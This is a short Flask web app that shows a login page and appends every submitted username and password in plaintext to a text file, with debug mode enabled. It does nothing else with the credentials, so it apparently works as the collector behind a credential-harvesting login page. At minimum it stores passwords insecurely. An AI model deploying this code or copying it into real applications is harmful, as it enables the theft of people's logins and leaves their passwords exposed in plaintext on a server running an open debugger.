from flask import Flask, request, render_template
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    
    # Save the data to a file
    with open('user_data.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')
    
    return 'Data saved successfully!'

if __name__ == '__main__':
    app.run(debug=True)